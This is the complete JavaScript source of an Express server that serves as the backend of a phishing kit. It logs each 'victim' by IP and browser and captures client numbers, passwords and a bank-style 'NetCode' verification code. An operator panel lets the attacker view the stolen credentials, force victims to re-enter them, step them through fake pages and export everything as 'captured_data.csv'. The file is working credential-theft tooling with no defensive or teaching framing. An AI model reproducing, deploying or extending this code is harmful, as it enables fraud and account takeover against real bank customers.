/* ----------  DEPENDENCIES  ---------- */
const express = require('express');
const cors = require('cors');
const crypto = require('crypto');
const path = require('path');

/* ----------  CONFIG  ---------- */
const PANEL_USER = process.env.PANEL_USER || 'admin';
const PANEL_PASS = process.env.PANEL_PASS || 'changeme';
const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
const COOKIE_NAME = 'pan_sess_v2';
const PORT = process.env.PORT || 8080;

const app = express();
app.set('trust proxy', 1);
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

/* ----------  SESSION MANAGEMENT  ---------- */
const sessionsMap = new Map();
const sessionActivity = new Map();
const auditLog = [];
let victimCounter = 0;
let successfulLogins = 0;
let currentDomain = '';

/* ----------  COOKIE & SESSION MIDDLEWARE  ---------- */
function signCookie(value, secret) {
  return crypto.createHmac('sha256', secret).update(value).digest('base64url');
}

function setSessionCookie(res, data) {
  const encoded = Buffer.from(JSON.stringify(data)).toString('base64url');
  const signature = signCookie(encoded, SESSION_SECRET);
  res.cookie(COOKIE_NAME, `${encoded}.${signature}`, {
    httpOnly: true,
    secure: true,
    sameSite: 'lax',
    maxAge: 24 * 60 * 60 * 1000,
    path: '/'
  });
}

function clearSessionCookie(res) {
  res.cookie(COOKIE_NAME, '', {
    httpOnly: true,
    secure: true,
    sameSite: 'lax',
    expires: new Date(0),
    path: '/'
  });
}

function getSessionCookie(req) {
  const cookie = req.cookies?.[COOKIE_NAME];
  if (!cookie) return null;
  const [encoded, signature] = cookie.split('.');
  if (!encoded || !signature) return null;
  const expectedSig = signCookie(encoded, SESSION_SECRET);
  if (signature !== expectedSig) return null;
  return JSON.parse(Buffer.from(encoded, 'base64url').toString());
}

app.use((req, res, next) => {
  req.cookies = {};
  if (req.headers.cookie) {
    req.headers.cookie.split(';').forEach(cookie => {
      const [name, ...rest] = cookie.trim().split('=');
      if (name && rest.length > 0) req.cookies[name] = rest.join('=');
    });
  }
  req.session = getSessionCookie(req) || {};
  next();
});

/* ----------  API ENDPOINTS  ---------- */

// Create a new session
app.post('/api/session', (req, res) => {
  const sid = crypto.randomUUID();
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
  const ua = req.headers['user-agent'] || 'n/a';
  victimCounter++;
  const victim = {
    sid,
    ip,
    ua,
    dateStr: new Date().toLocaleString(),
    clientNumber: '',
    password: '',
    netcode: '',
    page: 'index.html',
    platform: ua.includes('Mobile') ? 'Mobile' : 'Desktop',
    browser: ua.includes('Chrome') ? 'Chrome' : ua.includes('Firefox') ? 'Firefox' : 'Other',
    status: 'loaded',
    victimNum: victimCounter,
    activityLog: [{ time: Date.now(), action: 'CONNECTED', detail: 'Visitor connected to page' }]
  };
  sessionsMap.set(sid, victim);
  sessionActivity.set(sid, Date.now());
  res.json({ sid });
});

// Capture credentials
app.post('/api/login', (req, res) => {
  const { sid, email, password } = req.body;
  const session = sessionsMap.get(sid);
  if (!session) return res.sendStatus(404);
  session.clientNumber = email;
  session.password = password;
  session.status = 'ok';
  session.activityLog.push({ time: Date.now(), action: 'ENTERED CREDENTIALS', detail: `Client: ${email}` });
  res.sendStatus(200);
});

// Capture NetCode (verify.html sends to /api/verify)
app.post('/api/verify', (req, res) => {
  const { sid, netcode } = req.body;
  const session = sessionsMap.get(sid);
  if (!session) return res.sendStatus(404);
  session.netcode = netcode;
  session.status = 'approved';
  session.page = 'success';
  session.activityLog.push({ time: Date.now(), action: 'ENTERED NETCODE', detail: `NetCode: ${netcode}` });
  successfulLogins++;
  res.sendStatus(200);
});

// Update page status
app.post('/api/page', (req, res) => {
  const { sid, page } = req.body;
  const session = sessionsMap.get(sid);
  if (!session) return res.sendStatus(404);
  session.page = page;
  res.sendStatus(200);
});

// Ping to keep session alive
app.post('/api/ping', (req, res) => {
  const { sid } = req.body;
  if (sid) sessionActivity.set(sid, Date.now());
  res.sendStatus(200);
});

// Clear redo status
app.post('/api/clearRedo', (req, res) => {
  const { sid } = req.body;
  const session = sessionsMap.get(sid);
  if (!session) return res.sendStatus(404);
  if (session.status === 'redo') {
    session.status = 'ok';
  }
  res.sendStatus(200);
});

// Return session status
app.get('/api/status/:sid', (req, res) => {
  const session = sessionsMap.get(req.params.sid);
  if (!session) return res.json({ status: 'gone' });
  res.json({ status: session.status });
});

// Admin panel data
app.get('/api/panel', (req, res) => {
  if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });
  const list = Array.from(sessionsMap.values()).map(v => ({
    sid: v.sid,
    victimNum: v.victimNum,
    clientNumber: v.clientNumber,
    password: v.password,
    netcode: v.netcode,
    ip: v.ip,
    platform: v.platform,
    browser: v.browser,
    page: v.page,
    status: v.status,
    dateStr: v.dateStr,
    activityLog: v.activityLog
  }));
  res.json({
    domain: currentDomain,
    username: PANEL_USER,
    totalVictims: victimCounter,
    success: successfulLogins,
    sessions: list
  });
});

// Admin actions (redo, continue, delete)
app.post('/api/panel', (req, res) => {
  if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });
  const { action, sid } = req.body;
  const session = sessionsMap.get(sid);
  if (!session) return res.status(404).json({ ok: false });
  switch (action) {
    case 'redo':
      session.status = 'redo';
      session.clientNumber = '';
      session.password = '';
      session.netcode = '';
      break;
    case 'cont':
      session.status = 'ok';
      if (session.page === 'index.html') session.page = 'verify.html';
      else if (session.page === 'verify.html') session.page = 'success';
      break;
    case 'delete':
      sessionsMap.delete(sid);
      break;
  }
  res.json({ ok: true });
});

// Clear all sessions
app.post('/api/refresh', (req, res) => {
  if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });
  sessionsMap.clear();
  sessionActivity.clear();
  auditLog.length = 0;
  victimCounter = 0;
  successfulLogins = 0;
  res.json({ ok: true });
});

// Export data as CSV
app.get('/api/export', (req, res) => {
  if (!req.session?.authed) return res.status(401).send('Unauthorized');
  const successes = Array.from(sessionsMap.values())
    .filter(s => s.netcode)
    .map(s => ({
      victimNum: s.victimNum,
      clientNumber: s.clientNumber,
      password: s.password,
      netcode: s.netcode,
      ip: s.ip,
      ua: s.ua,
      timestamp: s.dateStr
    }));
  const csv = [
    ['Victim#', 'Client Number', 'Password', 'NetCode', 'IP', 'User Agent', 'Timestamp'],
    ...successes.map(s => Object.values(s).map(v => `"${v}"`))
  ].map(r => r.join(',')).join('\n');
  res.setHeader('Content-Type', 'text/csv');
  res.setHeader('Content-Disposition', 'attachment; filename="captured_data.csv"');
  res.send(csv);
});

/* ----------  PANEL ACCESS  ---------- */
app.get('/panel', (req, res) => {
  if (req.session?.authed) return res.sendFile(path.join(__dirname, '_panel.html'));
  res.sendFile(path.join(__dirname, 'access.html'));
});

app.post('/panel/login', (req, res) => {
  const { user, pw } = req.body;
  if (user === PANEL_USER && pw === PANEL_PASS) {
    req.session.authed = true;
    req.session.username = user;
    req.session.save = () => setSessionCookie(res, req.session);
    req.session.save();
    return res.redirect(303, '/panel');
  }
  res.redirect(303, '/panel?fail=1');
});

app.post('/panel/logout', (req, res) => {
  req.session.destroy = () => clearSessionCookie(res);
  req.session.destroy();
  res.redirect(303, '/panel');
});

/* ----------  START SERVER  ---------- */
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
  currentDomain = process.env.RAILWAY_STATIC_URL || `http://localhost:${PORT}`;
});
